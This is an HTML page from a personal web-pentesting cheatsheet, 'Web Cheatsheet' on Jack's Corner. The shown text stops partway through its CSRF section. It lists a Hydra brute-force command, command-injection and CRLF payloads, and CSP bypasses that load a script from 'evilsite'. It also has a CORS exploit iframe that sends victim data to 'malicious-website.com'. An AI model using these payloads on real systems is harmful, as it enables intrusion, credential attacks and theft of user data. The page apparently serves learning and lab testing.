
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="noindex" />

  <!--  <link rel="manifest" href="/assets/site.webmanifest" crossorigin="use-credentials">-->

  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/stylesheet/style.min.css">

    <link id="dark-theme-style" rel="stylesheet" type="text/css"
          media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
    href="http://localhost:1337/theme/stylesheet/dark-theme.min.css">

    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
          href="http://localhost:1337/theme/pygments/monokai.min.css">
    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: light)"
          href="http://localhost:1337/theme/pygments/emacs.min.css">


  <link rel="stylesheet"
        type="text/css"
        href="http://localhost:1337/theme/stork/stork.css" />

  <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/font-awesome/css/fontawesome.css">
  <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/font-awesome/css/brands.css">
  <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/font-awesome/css/solid.css">

        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/custom.css"> 
        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/zoom.css"> 
        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/collapsible-toc.css"> 
        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/goals.css"> 


      <script src="https://code.jquery.com/jquery-3.7.1.min.js" type="application/javascript"></script>
      <script src="https://cdn.jsdelivr.net/npm/dompurify@3.2.4/dist/purify.min.js" type="application/javascript"></script>
      <script src="http://localhost:1337/js/collapsible-toc.js" type="application/javascript"></script>
      <script src="http://localhost:1337/js/zoom.js" type="application/javascript"></script>
      <script src="http://localhost:1337/js/app.js" type="application/javascript"></script>
      <script src="http://localhost:1337/js/goals.js" type="application/javascript"></script>











 

<meta name="author" content="Jack69" />
<meta name="description" content="Information Gathering Enumerate server technology by 404 page; see this CMS Liferay Administrative default pages: ?p_p_id=com_liferay_login_web_portlet_LoginPortlet&amp;p_p_lifecycle=0&amp;p_p_state=maximized&amp;p_p_mode=view&amp;_com_liferay_login_web_portlet_LoginPortlet_mvcRenderCommandName=%2Flogin%2Flogin&amp;saveLastPath=false ?p_p_id=com_liferay_login_web_portlet_LoginPortlet&amp;p_p_lifecycle=0&amp;p_p_state=maximized&amp;p_p_mode=view&amp;_com_liferay_login_web_portlet_LoginPortlet_mvcRenderCommandName=%2Flogin%2Fcreate_account&amp;saveLastPath=false ?p_p_id=com_liferay_login_web_portlet_LoginPortlet&amp;p_p_lifecycle=0&amp;p_p_state=maximized&amp;p_p_mode=view&amp;_com_liferay_login_web_portlet_LoginPortlet_mvcRenderCommandName …" />
<meta name="keywords" content="">


  <meta property="og:site_name" content="Jack's Corner"/>
  <meta property="og:title" content="Web Cheatsheet"/>
  <meta property="og:description" content="Information Gathering Enumerate server technology by 404 page; see this CMS Liferay Administrative default pages: ?p_p_id=com_liferay_login_web_portlet_LoginPortlet&amp;p_p_lifecycle=0&amp;p_p_state=maximized&amp;p_p_mode=view&amp;_com_liferay_login_web_portlet_LoginPortlet_mvcRenderCommandName=%2Flogin%2Flogin&amp;saveLastPath=false ?p_p_id=com_liferay_login_web_portlet_LoginPortlet&amp;p_p_lifecycle=0&amp;p_p_state=maximized&amp;p_p_mode=view&amp;_com_liferay_login_web_portlet_LoginPortlet_mvcRenderCommandName=%2Flogin%2Fcreate_account&amp;saveLastPath=false ?p_p_id=com_liferay_login_web_portlet_LoginPortlet&amp;p_p_lifecycle=0&amp;p_p_state=maximized&amp;p_p_mode=view&amp;_com_liferay_login_web_portlet_LoginPortlet_mvcRenderCommandName …"/>
  <meta property="og:locale" content="en_US"/>
  <meta property="og:url" content="http://localhost:1337/web/cheatsheet.html"/>
  <meta property="og:type" content="article"/>
  <meta property="article:published_time" content="1957-01-01 00:00:00+01:00"/>
  <meta property="article:modified_time" content=""/>
  <meta property="article:author" content="http://localhost:1337/author/jack69.html">
  <meta property="article:section" content="Cheatsheet"/>
  <meta property="og:image" content="">

  <title>Jack's Corner &ndash; Web Cheatsheet</title>


</head>
<body >

<aside>
  <div>
    <a href="http://localhost:1337/">
      <img src="http://localhost:1337/theme/img/profile.png" alt="Jack's Corner" title="Jack's Corner">
    </a>

    <h1>
      <a href="http://localhost:1337/">Jack's Corner</a>
    </h1>


    <div class="stork">
        <input class="stork-input" type="text" autocomplete="off" name="q" data-stork="sitesearch" placeholder="Search..." onclick=""/>
      <div class="stork-output" data-stork="sitesearch-output"></div>
    </div>


    <ul class="social">
      <li>
        <a class="sc-htb"
           href="https://app.hackthebox.com/profile/177323"
           target="_blank">
          <i class="fa-brands fa-htb"></i>
        </a>
      </li>
      <li>
        <a class="sc-thm"
           href="https://tryhackme.com/p/jack69"
           target="_blank">
          <i class="fa-brands fa-thm"></i>
        </a>
      </li>
    </ul>
  </div>
</aside>
  <main>

<nav>
  <a href="http://localhost:1337/">Home</a>

  <a href="/categories.html">Categories</a>
  <a href="/category/cheatsheet.html">Cheatsheets</a>
  <a href="/personal/goals.html">Goals</a>


</nav>

<article class="single">
  <header>
      
    <h1 id="web/cheatsheet">Web Cheatsheet</h1>
    <p>

    </p>
  </header>


  <div>
        <div class="toc col-lg-3 hidden-xs hidden-sm">
            <div id="toc"><ul><li><a class="toc-href" href="#information-gathering" title="Information Gathering">Information Gathering</a></li><li><a class="toc-href" href="#cms" title="CMS">CMS</a><ul><li><a class="toc-href" href="#liferay" title="Liferay">Liferay</a></li></ul></li><li><a class="toc-href" href="#api-testing_1" title="API Testing">API Testing</a></li><li><a class="toc-href" href="#bruteforcing" title="Bruteforcing">Bruteforcing</a></li><li><a class="toc-href" href="#broken-access-control" title="Broken Access Control">Broken Access Control</a></li><li><a class="toc-href" href="#clickjacking" title="Clickjacking">Clickjacking</a></li><li><a class="toc-href" href="#command-injection" title="Command Injection">Command Injection</a></li><li><a class="toc-href" href="#content-security-policy" title="Content Security Policy">Content Security Policy</a><ul><li><a class="toc-href" href="#bypasses" title="Bypasses">Bypasses</a></li><li><a class="toc-href" href="#crlf-injection" title="CRLF Injection">CRLF Injection</a></li></ul></li><li><a class="toc-href" href="#cross-origin-resource-sharing-cors_1" title="Cross-Origin Resource Sharing (CORS)">Cross-Origin Resource Sharing (CORS)</a></li><li><a class="toc-href" href="#cross-site-request-forgery-csrf" title="Cross-Site Request Forgery (CSRF)">Cross-Site Request Forgery (CSRF)</a><ul><li><a class="toc-href" href="#samesite-cookies" title="SameSite Cookies">SameSite Cookies</a></li><li><a class="toc-href" href="#bypasses_1" title="Bypasses">Bypasses</a><ul><li><a class="toc-href" href="#generic-bypasses" title="Generic Bypasses">Generic Bypasses</a></li><li><a class="toc-href" href="#samesite-cookie-bypasses" title="SameSite Cookie Bypasses">SameSite Cookie Bypasses</a></li><li><a class="toc-href" href="#referer-bypasses" title="Referer Bypasses">Referer Bypasses</a></li></ul></li></ul></li><li><a class="toc-href" href="#cross-site-scripting-xss_2" title="Cross-Site Scripting (XSS)">Cross-Site Scripting (XSS)</a><ul><li><a class="toc-href" href="#dom-cross-site-scripting" title="DOM Cross-Site Scripting">DOM Cross-Site Scripting</a></li><li><a class="toc-href" href="#src-attribute-xss" title="src Attribute XSS">src Attribute XSS</a></li><li><a class="toc-href" href="#hidden-input-xss" title="Hidden Input XSS">Hidden Input XSS</a></li><li><a class="toc-href" href="#phone-number-input-xss" title="Phone Number Input XSS">Phone Number Input XSS</a></li><li><a class="toc-href" href="#content-type-abuse" title="Content-Type abuse">Content-Type abuse</a></li><li><a class="toc-href" href="#javascript-url-xss" title="Javascript URL XSS">Javascript URL XSS</a></li><li><a class="toc-href" href="#jquery-dom-xss" title="jQuery DOM XSS">jQuery DOM XSS</a></li><li><a class="toc-href" href="#angular-js-xss" title="Angular JS XSS">Angular JS XSS</a></li><li><a class="toc-href" href="#useful-scripts" title="Useful Scripts">Useful Scripts</a></li><li><a class="toc-href" href="#bypasses_2" title="Bypasses">Bypasses</a></li></ul></li><li><a class="toc-href" href="#dom-clobbering_1" title="DOM Clobbering">DOM Clobbering</a></li><li><a class="toc-href" href="#graphql" title="GraphQL">GraphQL</a><ul><li><a class="toc-href" href="#universal-query" title="Universal Query">Universal Query</a></li><li><a class="toc-href" href="#enumerate-endpoint-accepted-methods" title="Enumerate endpoint accepted methods">Enumerate endpoint accepted methods</a></li><li><a class="toc-href" href="#introspection" title="Introspection">Introspection</a></li><li><a class="toc-href" href="#rate-limit-bypass" title="Rate limit bypass">Rate limit bypass</a></li></ul></li><li><a class="toc-href" href="#host-header-attacks_1" title="Host Header Attacks">Host Header Attacks</a><ul><li><a class="toc-href" href="#javascript-injection" title="Javascript Injection">Javascript Injection</a></li></ul></li><li><a class="toc-href" href="#jwt-attacks_1" title="JWT Attacks">JWT Attacks</a><ul><li><a class="toc-href" href="#algorithm-confusion-attacks" title="Algorithm Confusion Attacks">Algorithm Confusion Attacks</a></li></ul></li><li><a class="toc-href" href="#nosql-injection-nosqli_1" title="NoSQL Injection (NoSQLi)">NoSQL Injection (NoSQLi)</a></li><li><a class="toc-href" href="#oauth2" title="OAuth2">OAuth2</a></li><li><a class="toc-href" href="#prototype-pollution" title="Prototype Pollution">Prototype Pollution</a></li><li><a class="toc-href" href="#race-conditions" title="Race Conditions">Race Conditions</a></li><li><a class="toc-href" href="#same-origin-policy-sop" title="Same-Origin Policy (SOP)">Same-Origin Policy (SOP)</a></li><li><a class="toc-href" href="#saml" title="SAML">SAML</a></li><li><a class="toc-href" href="#server-side-request-forgery-ssrf" title="Server-Side Request Forgery (SSRF)">Server-Side Request Forgery (SSRF)</a><ul><li><a class="toc-href" href="#bypasses_3" title="Bypasses">Bypasses</a></li></ul></li><li><a class="toc-href" href="#sql-injection_1" title="SQL Injection">SQL Injection</a></li><li><a class="toc-href" href="#open-redirect" title="Open Redirect">Open Redirect</a><ul><li><a class="toc-href" href="#bypasses_4" title="Bypasses">Bypasses</a></li></ul></li><li><a class="toc-href" href="#file-inclusion_1" title="File Inclusion">File Inclusion</a><ul><li><a class="toc-href" href="#php-filters-and-wrappers" title="PHP Filters and Wrappers">PHP Filters and Wrappers</a></li><li><a class="toc-href" href="#bypasses_5" title="Bypasses">Bypasses</a></li></ul></li><li><a class="toc-href" href="#file-upload_1" title="File Upload">File Upload</a><ul><li><a class="toc-href" href="#bypasses_6" title="Bypasses">Bypasses</a></li></ul></li><li><a class="toc-href" href="#xml-external-entities-injection-xxe_1" title="XML External Entities Injection (XXE)">XML External Entities Injection (XXE)</a></li><li><a class="toc-href" href="#request-smuggling" title="Request Smuggling">Request Smuggling</a><ul><li><a class="toc-href" href="#http11" title="HTTP/1.1">HTTP/1.1</a></li><li><a class="toc-href" href="#http2" title="HTTP/2">HTTP/2</a><ul><li><a class="toc-href" href="#http2-downgrading" title="HTTP/2 downgrading">HTTP/2 downgrading</a><ul><li><a class="toc-href" href="#h2cl" title="H2.CL">H2.CL</a></li><li><a class="toc-href" href="#h2te" title="H2.TE">H2.TE</a><ul><li><a class="toc-href" href="#request-smuggling-via-crlf-injection" title="Request Smuggling via CRLF Injection">Request Smuggling via CRLF Injection</a></li></ul></li><li><a class="toc-href" href="#response-queue-poisoning_1" title="Response queue poisoning">Response queue poisoning</a></li><li><a class="toc-href" href="#http2-request-splitting" title="HTTP/2 request splitting">HTTP/2 request splitting</a></li><li><a class="toc-href" href="#http-request-tunnelling" title="HTTP request tunnelling">HTTP request tunnelling</a></li></ul></li></ul></li><li><a class="toc-href" href="#client-side-desync-attacks_2" title="Client-side Desync Attacks">Client-side Desync Attacks</a><ul><li><a class="toc-href" href="#cl0" title="CL.0">CL.0</a></li></ul></li><li><a class="toc-href" href="#pause-based-desync-attacks_1" title="Pause-based desync attacks">Pause-based desync attacks</a><ul><li><a class="toc-href" href="#server-side-pause-based-desync" title="Server-side pause-based desync">Server-side pause-based desync</a></li></ul></li><li><a class="toc-href" href="#bypasses_8" title="Bypasses">Bypasses</a></li></ul></li><li><a class="toc-href" href="#server-side-parameter-pollution_1" title="Server-Side Parameter Pollution">Server-Side Parameter Pollution</a></li><li><a class="toc-href" href="#template-injection" title="Template Injection">Template Injection</a><ul><li><a class="toc-href" href="#server-side-template-injection-ssti" title="Server-Side Template Injection (SSTI)">Server-Side Template Injection (SSTI)</a></li><li><a class="toc-href" href="#bypasses_9" title="Bypasses">Bypasses</a></li></ul></li><li><a class="toc-href" href="#unsafe-deserialization_1" title="Unsafe Deserialization">Unsafe Deserialization</a><ul><li><a class="toc-href" href="#type-juggling" title="Type Juggling">Type Juggling</a></li><li><a class="toc-href" href="#magic-methods" title="Magic Methods">Magic Methods</a></li><li><a class="toc-href" href="#phar" title="PHAR">PHAR</a></li><li><a class="toc-href" href="#ysoserial" title="ysoserial">ysoserial</a></li><li><a class="toc-href" href="#ruby" title="Ruby">Ruby</a></li></ul></li><li><a class="toc-href" href="#web-cache_1" title="Web Cache">Web Cache</a><ul><li><a class="toc-href" href="#web-cache-deception" title="Web Cache Deception">Web Cache Deception</a></li><li><a class="toc-href" href="#web-cache-poisoning" title="Web Cache Poisoning">Web Cache Poisoning</a><ul><li><a class="toc-href" href="#cache-key-flaws" title="Cache key flaws">Cache key flaws</a></li><li><a class="toc-href" href="#key-normalization" title="Key normalization">Key normalization</a></li></ul></li></ul></li><li><a class="toc-href" href="#waf-filters-bypasses_2" title="WAF Filters Bypasses">WAF Filters Bypasses</a></li><li><a class="toc-href" href="#generic-bypasses_1" title="Generic Bypasses">Generic Bypasses</a></li><li><a class="toc-href" href="#automatic-testing" title="Automatic Testing">Automatic Testing</a></li></ul></div>
        </div>
    <h2 id="information-gathering">Information Gathering</h2>
<p>Enumerate server technology by 404 page; see <a href="https://0xdf.gitlab.io/cheatsheets/404#">this</a></p>
<h2 id="cms">CMS</h2>
<h3 id="liferay">Liferay</h3>
<p>Administrative default pages:</p>
<div class="highlight"><pre><span></span><code>?p_p_id=com_liferay_login_web_portlet_LoginPortlet&amp;p_p_lifecycle=0&amp;p_p_state=maximized&amp;p_p_mode=view&amp;_com_liferay_login_web_portlet_LoginPortlet_mvcRenderCommandName=%2Flogin%2Flogin&amp;saveLastPath=false

?p_p_id=com_liferay_login_web_portlet_LoginPortlet&amp;p_p_lifecycle=0&amp;p_p_state=maximized&amp;p_p_mode=view&amp;_com_liferay_login_web_portlet_LoginPortlet_mvcRenderCommandName=%2Flogin%2Fcreate_account&amp;saveLastPath=false

?p_p_id=com_liferay_login_web_portlet_LoginPortlet&amp;p_p_lifecycle=0&amp;p_p_state=maximized&amp;p_p_mode=view&amp;_com_liferay_login_web_portlet_LoginPortlet_mvcRenderCommandName=%2Flogin%2Fforgot_password&amp;saveLastPath=false

/c/portal/control_panel

/portal/invoker

/api/jsonws
</code></pre></div>
<h2 id="api-testing_1">API Testing</h2>
<p>Interesting endpoints: </p>
<div class="highlight"><pre><span></span><code>/api
/swagger/index.html
/openapi.json
/api/swagger/v1
/api/swagger
/openapi/ui/
</code></pre></div>
<p>When fuzzing API endpoint via <strong>SSRF</strong> or <strong>Server-Side Parameter Pollution</strong>, it's worth trying to append a <code>%23</code> (URL-Encoded #) to break the URL parsing when the server is appending some stuff AFTER the injected payload:</p>
<div class="highlight"><pre><span></span><code><span class="x">https://vulnerablesite/path_before/</span><span class="cp">{{</span><span class="nv">injection_point</span><span class="cp">}}</span><span class="x">/</span><span class="cp">{{</span><span class="err">?</span><span class="nv">query_params</span> <span class="k">or</span> <span class="nv">path</span> <span class="nv">slices</span> <span class="nv">appendend</span> <span class="nv">by</span> <span class="nv">the</span> <span class="nv">server</span><span class="cp">}}</span>
</code></pre></div>
<h2 id="bruteforcing">Bruteforcing</h2>
<p>Brute-force HTTP POST form with Hydra:</p>
<div class="highlight"><pre><span></span><code>hydra -c 1 -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.118 http-form-post '/admin/:username=^USER^&amp;password=^PASS^:Login'
</code></pre></div>
<p>Interesting not common endpoints:</p>
<div class="highlight"><pre><span></span><code>/_vti_pvt/service.pwd # https://stackoverflow.com/questions/1163820/what-are-vti-cnf-vti-pvt-vti-script-and-vti-txt-folders
/__better_errors # https://github.com/BetterErrors/better_errors?tab=readme-ov-file#better-errors - Debug console can allow RCE
home/000~ROOT~000 # https://github.com/stefanpejcic/wordpress-malware/blob/9b74dec23ed0e8041f9c49de1fcd568f5342796e/23.10.2020/sy.php - Symlink attack already carried out by other attackers
</code></pre></div>
<h2 id="broken-access-control">Broken Access Control</h2>
<p>Here's a list of worth-to-try restriction bypasses:</p>
<ul>
<li>Some application frameworks support various non-standard HTTP headers that can be used to override the URL in the original request, such as <code>X-Original-URL</code> and <code>X-Rewrite-URL</code>. If a website uses rigorous front-end controls to restrict access based on the URL, but the application allows the URL to be overridden via a request header, then it might be possible to bypass access controls like <code>DENY: POST, /admin/deleteUser, managers</code>.</li>
<li>The Spring framework have enabled the <code>useSuffixPatternMatch</code> option. This allows paths with an arbitrary file extension to be mapped to an equivalent endpoint with no file extension. In other words, a request to <code>/admin/deleteUser.anything</code> would still match the <code>/admin/deleteUser</code> pattern. Prior to Spring 5.3, this option is enabled by default.</li>
<li>Append a trailing <code>/</code>: <code>/admin/deleteUser</code> to <code>/admin/deleteUser/</code>.</li>
<li>Uppercase the URL path: <code>/admin/deleteUser</code> to <code>/ADMIN/DELETEUSER</code>.</li>
<li>Try different HTTP verbs.</li>
<li><code>Referer</code> header tampering if the application has Referer-based access controls.</li>
</ul>
<h2 id="clickjacking">Clickjacking</h2>
<p>Basic template:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
<span class="w">        </span><span class="p">#</span><span class="nn">target_website</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">position</span><span class="p">:</span><span class="kc">relative</span><span class="p">;</span>
<span class="w">            </span><span class="k">width</span><span class="p">:</span><span class="mi">128</span><span class="kt">px</span><span class="p">;</span>
<span class="w">            </span><span class="k">height</span><span class="p">:</span><span class="mi">128</span><span class="kt">px</span><span class="p">;</span>
<span class="w">            </span><span class="k">opacity</span><span class="p">:</span><span class="mf">0.00001</span><span class="p">;</span>
<span class="w">            </span><span class="k">z-index</span><span class="p">:</span><span class="mi">2</span><span class="p">;</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">#</span><span class="nn">decoy_website</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">position</span><span class="p">:</span><span class="kc">absolute</span><span class="p">;</span>
<span class="w">            </span><span class="k">width</span><span class="p">:</span><span class="mi">300</span><span class="kt">px</span><span class="p">;</span>
<span class="w">            </span><span class="k">height</span><span class="p">:</span><span class="mi">400</span><span class="kt">px</span><span class="p">;</span>
<span class="w">            </span><span class="k">z-index</span><span class="p">:</span><span class="mi">1</span><span class="p">;</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">    </span><span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
...
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">"decoy_website"</span><span class="p">&gt;</span>
    ...decoy web content here...
    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">id</span><span class="o">=</span><span class="s">"target_website"</span> <span class="na">src</span><span class="o">=</span><span class="s">"https://vulnerable-website.com"</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</code></pre></div>
<p>To bypass frame busting scripts, it's useful to use the iframe <code>sandbox</code> attribute with the <code>allow-forms</code>, <code>allow-scripts</code>, <code>allow-top-navigation</code>; when these values are set, the irame buster script can be neutralized as the iframe cannot check whether or not it is the top window:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">id</span><span class="o">=</span><span class="s">"victim_website"</span> <span class="na">src</span><span class="o">=</span><span class="s">"https://victim-website.com"</span> <span class="na">sandbox</span><span class="o">=</span><span class="s">"allow-forms allow-script allow-top-navigation"</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
</code></pre></div>
<h2 id="command-injection">Command Injection</h2>
<p>Basic payloads:</p>
<div class="highlight"><pre><span></span><code><span class="p">&amp;</span><span class="w"> </span><span class="nb">command</span><span class="w"> </span><span class="p">&amp;</span>
<span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">command</span><span class="w"> </span><span class="o">&amp;&amp;</span>
<span class="p">;</span><span class="w"> </span><span class="nb">command</span><span class="w"> </span><span class="p">;</span>
<span class="p">|</span><span class="w"> </span><span class="nb">command</span><span class="w"> </span><span class="p">|</span>
<span class="o">||</span><span class="w"> </span><span class="nb">command</span><span class="w"> </span><span class="o">||</span>
<span class="p">;</span><span class="w"> </span><span class="k">$(</span>subcommand<span class="k">)</span><span class="w"> </span><span class="p">;</span>
<span class="p">;</span><span class="w"> </span><span class="sb">`</span>subcommand<span class="sb">`</span><span class="w"> </span><span class="p">;</span>

<span class="c1"># newline</span>
0x0a<span class="w"> </span>
<span class="se">\n</span>
</code></pre></div>
<p>Time-base feedback for Blind OS command-injection to exfiltrate data, eventually URL Encoded:</p>
<div class="highlight"><pre><span></span><code><span class="c1"># &gt; whoami</span>
<span class="c1"># jack</span>

<span class="nv">c</span><span class="o">=</span><span class="k">$(</span>whoami<span class="k">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="s2">"</span><span class="nv">$c</span><span class="s2">"</span><span class="w"> </span><span class="o">=</span>~<span class="w"> </span><span class="s2">"ja"</span><span class="p">;</span><span class="w"> </span><span class="k">then</span><span class="w"> </span>sleep<span class="w"> </span><span class="m">2</span><span class="p">;</span><span class="k">fi</span><span class="w"> </span>
</code></pre></div>
<h2 id="content-security-policy">Content Security Policy</h2>
<h3 id="bypasses">Bypasses</h3>
<p>It's possible to bypass a CSP like <code>default-src 'none'; base-uri 'none';</code> by exploiting an eventual dangling markup injection, setting a <code>&lt;base&gt;</code> tag with the attribute <code>target</code>having only the opening quote (dangling). The value of this attribute from the <code>&lt;base&gt;</code> tag sets the value for the <code>window.name</code> property <strong>for every link in the page</strong>.</p>
<p>An attacker could somehow make the user click on a <code>&lt;a&gt;</code>; being the <code>target</code> attribute for the <code>&lt;base&gt;</code> tag dangling, its value (so the <code>window.name</code>) will contain the HTML code following the dangling attribute until a closing quote is found, allowing to partially exfiltrate the page content. </p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">http://evilsite</span><span class="p">&gt;</span>You must click me<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;</span><span class="nt">base</span> <span class="na">target</span><span class="o">=</span><span class="s">"</span>
</code></pre></div>
<p>Note: <strong>if the double quote <code>"</code> does not work, try with a single quote <code>'</code>.</strong></p>
<p>Edge will drop the entire policy when it encounters invalid syntax; if some user controllable input gets reflected in the CSP, when using edge it's sufficient to inject some breaking characters such as <code>;_</code> in order to make the whole CSP be dropped.</p>
<div class="highlight"><pre><span></span><code><span class="nt">https</span><span class="o">://</span><span class="nt">vulnerablesite</span><span class="o">?</span><span class="nt">values</span><span class="o">=</span><span class="nt">etc</span><span class="o">&amp;</span><span class="nt">token</span><span class="o">=</span><span class="nt">SOME_REFLECTED_VALUE</span><span class="o">;</span><span class="nt">_</span>
</code></pre></div>
<p>With Chrome/Firefox this is not possible; instead it's possible to overwrite <code>script-src</code> by injecting the <code>script-src-elem</code> directive which specifies which controls only script blocks and not also inline event handlers, differently from <code>script-src</code>.</p>
<div class="highlight"><pre><span></span><code>http://vulnerablesite?x=%3Bscript-src-elem+*&amp;y=%3Cscript+src=%22http://evilsite/xss.js%22%3E%3C/script%3E
</code></pre></div>
<p>Bypass <code>form-action</code> directive:
<a href="https://labs.detectify.com/ethical-hacking/content-security-policy-csp-bypassing-form-action-with-reflected-xss/">CSP form-action Bypass with reflected XSS </a></p>
<h3 id="crlf-injection">CRLF Injection</h3>
<p>Some payloads:</p>
<div class="highlight"><pre><span></span><code>/%%0a0aSet-Cookie:crlf=injection
/%0aSet-Cookie:crlf=injection
/%0d%0aSet-Cookie:crlf=injection
/%0dSet-Cookie:crlf=injection
/%23%0aSet-Cookie:crlf=injection
/%23%0d%0aSet-Cookie:crlf=injection
/%23%0dSet-Cookie:crlf=injection
/%25%30%61Set-Cookie:crlf=injection
/%25%30aSet-Cookie:crlf=injection
/%250aSet-Cookie:crlf=injection
/%25250aSet-Cookie:crlf=injection
/%2e%2e%2f%0d%0aSet-Cookie:crlf=injection
/%2f%2e%2e%0d%0aSet-Cookie:crlf=injection
/%2F..%0d%0aSet-Cookie:crlf=injection
/%3f%0d%0aSet-Cookie:crlf=injection
/%3f%0dSet-Cookie:crlf=injection
/%u000aSet-Cookie:crlf=injection
</code></pre></div>
<h2 id="cross-origin-resource-sharing-cors_1">Cross-Origin Resource Sharing (CORS)</h2>
<p><code>Access-Control-Allow-Origin</code> (ACAO) is set to null for:</p>
<ul>
<li>Cross-origin redirects</li>
<li>Requests from serialized data</li>
<li>Requests using non-hierarchical schemes such as <code>file:</code> or <code>data:</code></li>
<li>Sandboxed cross-origin requests</li>
</ul>
<p>It's possible to use sandboxed <code>iframe</code> to generate a cross-origin request with the <code>null</code> Origin:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">sandbox</span><span class="o">=</span><span class="s">"allow-scripts allow-top-navigation allow-forms"</span> <span class="na">src</span><span class="o">=</span><span class="s">"data:text/html,&lt;script&gt;</span>
<span class="s">var req = new XMLHttpRequest();</span>
<span class="s">req.onload = reqListener;</span>
<span class="s">req.open('get','vulnerable-website.com/sensitive-victim-data',true);</span>
<span class="s">req.withCredentials = true;</span>
<span class="s">req.send();</span>

<span class="s">function reqListener() {</span>
<span class="s">location='malicious-website.com/log?key='+this.responseText;</span>
<span class="s">};</span>
<span class="s">&lt;/script&gt;"</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
</code></pre></div>
<h2 id="cross-site-request-forgery-csrf">Cross-Site Request Forgery (CSRF)</h2>
<h3 id="samesite-cookies">SameSite Cookies</h3>
<p>Some applications do not validate that the token belongs to the same session as the user who is making the request.</p>
<p>In the context of the SameSite, when determining whether a request is same-site or not, the <strong>site</strong> is considered as the <code>scheme</code> plus the <code>TLD + 1</code>.</p>
<p><strong>Example</strong>: for the URL https://app.example.com, the <strong>site</strong> is considered as <code>https://</code> and <code>example.com</code>.</p>
<p>Note: the concept of <strong>site</strong> for the <strong>SameSite</strong> cookies is different from the concept of <strong>origin</strong> for the <strong>SameOrigin</strong> policy.
Instead, two URLs are considered to have the same <strong>origin</strong> if they share the exact same scheme, domain name, and port.</p>
<p><strong>Example</strong>: https://app.example.com:443 IS the origin</p>
<p>Difference between site and origin:</p>
<ul>
<li>A site encompasses multiple domain names, whereas an origin only includes one.</li>
</ul>
<p>SameSite supports three restriction levels:</p>
<ul>
<li><strong>Strict</strong>: browsers will not send it in any cross-site requests.</li>
<li><strong>Lax</strong>: browsers will send the cookie in cross-site requests only for <code>GET</code> requests generated from a top-level navigation by the uses (ex: the user clicked a link). The cookie are not included in <code>POST</code> and background requests (images, scripts, iframes).</li>
<li><strong>None</strong>:  browsers will send this cookie in all requests to the site that issued it, even those that were triggered by completely unrelated third-party sites. When <code>SameSite</code> is set to <code>None</code>, the <code>Secure</code> attribute is mandatory for the cookie.</li>
</ul>
<p>These levels can be explicitly set in the cookie definition with the <code>SameSite</code> attribute:</p>
<div class="highlight"><pre><span></span><code><span class="nt">Set-Cookie</span><span class="o">:</span><span class="w"> </span><span class="nt">session</span><span class="o">=</span><span class="nt">0F8tgdOhi9ynR1M9wa3ODa</span><span class="o">;</span><span class="w"> </span><span class="nt">SameSite</span><span class="o">=</span><span class="nt">Strict</span>
</code></pre></div>
<p>Generally, <code>Lax</code> is the default. When <code>Lax</code> is set by default (<strong>not when it's explicited!</strong>), browsers wait 120 seconds for <strong>top-level</strong> <code>POST</code> requests before enforce the <code>Lax</code> restrictions. This is needed in order to not break SSO mechanisms which involve cross-site requests.</p>
<p>Note: Applications that accept only POST requests with <code>application/json</code> content type <strong>ARE NOT</strong> vulnerable to CSRF since <code>&lt;form&gt;</code> do not support this mime type in his <code>enctype</code> attribute (that determines the mime type to use when submitting data with the form).</p>
<h3 id="bypasses_1">Bypasses</h3>
<h4 id="generic-bypasses">Generic Bypasses</h4>
<ul>
<li>Some applications correctly validate the token when the request uses the <strong>POST</strong> method but skip the validation when the <strong>GET</strong> method is used; try switching the method to GET.</li>
<li>Some applications correctly validate the token when it is present but skip the validation if the token is omitted.</li>
